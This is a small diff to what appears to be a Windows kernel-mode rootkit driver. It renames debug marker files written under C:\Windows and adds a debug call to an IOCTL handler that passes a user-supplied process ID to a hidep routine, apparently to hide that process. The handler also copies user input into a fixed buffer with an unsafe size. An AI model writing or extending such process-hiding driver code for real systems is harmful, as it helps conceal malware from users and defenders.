@@ -11,7 +11,7 @@ NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessag
 	UNICODE_STRING     uniName;
 	OBJECT_ATTRIBUTES  objAttr;
 	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
-	RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\Windows\\NOTCOOL.txt");  // or L"\\SystemRoot\\example.txt"
+	RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\Windows\\EPIC.txt");  // or L"\\SystemRoot\\example.txt"
 	InitializeObjectAttributes(&objAttr, &uniName,
 		OBJ_CASE_INSENSITIVE,
 		NULL, NULL);
@@ -71,7 +71,7 @@ NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
 	char pid[32];
 	strcpy_s(pid, inBufferLength, inBuf);
 
-	 
+	debugFile(L"\\DosDevices\\C:\\Windows\\HEREE.txt");
 	hidep(atoi(pid));
 
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
